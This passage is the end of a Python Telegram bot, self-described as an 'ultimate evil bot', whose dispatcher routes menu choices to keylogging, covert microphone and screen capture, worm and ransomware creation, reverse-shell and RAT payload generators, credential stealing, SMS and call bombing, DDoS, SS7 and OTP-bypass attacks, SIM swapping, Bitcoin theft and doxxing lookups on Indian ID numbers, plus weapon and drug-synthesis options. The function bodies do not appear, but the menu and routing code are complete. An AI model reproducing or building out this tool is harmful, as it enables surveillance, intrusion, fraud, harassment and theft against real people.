        '🏦 BANK BALANCE': ('instant', 'bankbalance'),
        '🎙️ MICROPHONE': ('instant', 'mic'),
        '🖥️ SCREEN CAPTURE': ('instant', 'screen'),
        '⌨️ KEYLOGGER': ('instant', 'keylog'),
        '🐛 WORM MAKER': ('instant', 'worm')
    }

    if text in actions:
        typ, prompt, act = actions[text]
        if typ == 'awaiting':
            send_message(chat_id, prompt, cancel_keyboard())
            user_states[chat_id] = {'stage': 'awaiting', 'action': act}
        else:
            result = None
            if act == 'social': result = social_engineer_kit()
            elif act == 'weapon': result = weapon_blueprints()
            elif act == 'drug': result = drug_synthesis()
            elif act == 'atm': result = atm_skimmer()
            elif act == 'simclone': result = sim_cloning()
            elif act == 'bitcointheft': result = bitcoin_theft()
            elif act == 'ransom': result = ransomware_sim()
            elif act == 'cred': result = cred_stealer()
            elif act == 'cc': result = cc_gen()
            elif act == 'webcam': result = webcam_trick()
            elif act == 'simswap': result = sim_swap_guide()
            elif act == 'bankbalance': result = bank_balance_sim()
            elif act == 'wificrack': result = wifi_crack()
            elif act == 'deepfake': result = deepfake_ai()
            elif act == 'voice': result = voice_cloning()
            elif act == 'raas': result = ransomware_as_service()
            elif act == 'destroy': result = destroy_evidence()
            elif act == 'mic':
                path = microphone_record()
                if path:
                    send_document(chat_id, path, caption="🎙️ Recording")
                    result = "Audio sent."
                else: result = "Microphone failed."
            elif act == 'screen':
                path = screen_capture()
                if path:
                    send_photo(chat_id, path, caption="🖥️ Screenshot")
                    result = "Screenshot sent."
                else: result = "Screenshot failed."
            elif act == 'keylog':
                result = keylogger_start()
            elif act == 'worm':
                path = worm_maker()
                send_document(chat_id, path, caption="🐛 Worm payload")
                result = "Worm created."
            if result:
                send_message(chat_id, result, main_keyboard())
            user_states[chat_id] = {}
        return

    # Awaiting input handling
    if user_states.get(chat_id, {}).get('stage') == 'awaiting':
        act = user_states[chat_id]['action']
        inp = text
        send_message(chat_id, "⏳ Processing...")
        result = None
        if act == 'number': result = number_lookup(inp)
        elif act == 'aadhaar': result = aadhaar_lookup(inp)
        elif act == 'family': result = family_lookup(inp)
        elif act == 'pincode': result = pincode_lookup(inp)
        elif act == 'ifsc': result = ifsc_lookup(inp)
        elif act == 'instagram': result = instagram_lookup(inp)
        elif act == 'telegram': result = telegram_lookup(inp)
        elif act == 'vehicle': result = vehicle_lookup(inp)
        elif act == 'pan': result = pan_lookup(inp)
        elif act == 'voter': result = voter_lookup(inp)
        elif act == 'driving': result = driving_lookup(inp)
        elif act == 'upi': result = upi_lookup(inp)
        elif act == 'gst': result = gst_lookup(inp)
        elif act == 'twitter': result = twitter_lookup(inp)
        elif act == 'facebook': result = facebook_lookup(inp)
        elif act == 'sms': result = sms_bomb(inp)
        elif act == 'call': result = call_bomb(inp)
        elif act == 'ddos': result = ddos_attack(inp)
        elif act == 'ip': result = ip_geolocate(inp)
        elif act == 'nuke': result = nuke_group(inp)
        elif act == 'massdm': result = mass_dm(inp)
        elif act == 'portscan': result = port_scan(inp)
        elif act == 'subdomain': result = subdomain_finder(inp)
        elif act == 'adminfind': result = admin_finder(inp)
        elif act == 'whois': result = whois_lookup(inp)
        elif act == 'dns': result = dns_lookup(inp)
        elif act == 'reverseip': result = reverse_ip(inp)
        elif act == 'emailverify': result = email_verify(inp)
        elif act == 'phoneinfo': result = phone_info(inp)
        elif act == 'passleak': result = password_leak(inp)
        elif act == 'hashdec': result = hash_decrypt(inp)
        elif act == 'btc': result = btc_balance(inp)
        elif act == 'qrgen':
            path = qr_generate(inp)
            send_photo(chat_id, path, caption="QR Code")
            result = "QR generated."
        elif act == 'shorten': result = url_shorten(inp)
        elif act == 'weather': result = weather(inp)
        elif act == 'tts':
            path = text_to_speech(inp)
            if path:
                send_document(chat_id, path, caption="🔊 TTS audio")
                result = "Audio sent."
            else: result = "TTS failed."
        elif act == 'translate': result = translate_text(inp)
        elif act == 'currency':
            parts = inp.split()
            if len(parts) == 3: result = currency_convert(parts[0], parts[1], parts[2])
            else: result = "Usage: 100 USD INR"
        elif act == 'ratshell':
            parts = inp.split()
            if len(parts) == 2:
                path = reverse_shell_payload(parts[0], int(parts[1]))
                send_document(chat_id, path, caption="🐍 Reverse shell")
                result = "Payload sent."
            else: result = "Usage: IP PORT"
        elif act == 'zipcrack': result = zip_crack(inp)
        elif act == 'pdfcrack': result = pdf_crack(inp)
        elif act == 'androidrat':
            parts = inp.split()
            if len(parts) == 2: result = android_rat_payload(parts[0], parts[1])
            else: result = "Usage: IP PORT"
        elif act == 'windowsrat':
            parts = inp.split()
            if len(parts) == 2: result = windows_rat_payload(parts[0], parts[1])
            else: result = "Usage: IP PORT"
        elif act == 'bluetooth': result = bluetooth_hijack(inp)
        elif act == 'webhook':
            parts = inp.split()
            if len(parts) == 2: result = webhook_hijack(parts[0], parts[1])
            else: result = "Usage: bot_token new_url"
        elif act == 'ss7': result = ss7_attack(inp)
        elif act == 'otp': result = otp_bypass(inp)
        elif act == 'hackcam': result = hack_camera(inp)

        if result: send_message(chat_id, result, main_keyboard())
        else: send_message(chat_id, "Done.", main_keyboard())
        user_states[chat_id] = {}
        return

    send_message(chat_id, "❌ Use the buttons below.", main_keyboard())

# ==================== MAIN LOOP ====================
def main():
    print("🔥 OMEGA DARK CORE – ULTIMATE EVIL BOT STARTED 🔥")
    print("Developer: RODIX HACKER")
    print("Bot is running. Press Ctrl+C to stop.")
    last_id = 0
    while True:
        try:
            resp = requests.get(API_URL + 'getUpdates', params={'offset': last_id+1, 'timeout': 30}, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok'):
                    for upd in data.get('result', []):
                        last_id = upd['update_id']
                        handle_update(upd)
            time.sleep(1)
        except KeyboardInterrupt:
            print("\nBot stopped.")
            break
        except Exception as e:
            logger.error(f"Error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Auto-install required packages
    required = ['requests', 'cryptography', 'qrcode', 'pillow', 'phonenumbers', 
                'dnspython', 'python-whois', 'beautifulsoup4', 'gtts', 'googletrans==4.0.0rc1',
                'pyaudio', 'pyscreenshot', 'opencv-python', 'pynput']
    for pkg in required:
        try:
            __import__(pkg.split('==')[0])
        except ImportError:
            print(f"Installing {pkg}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg])
    main()
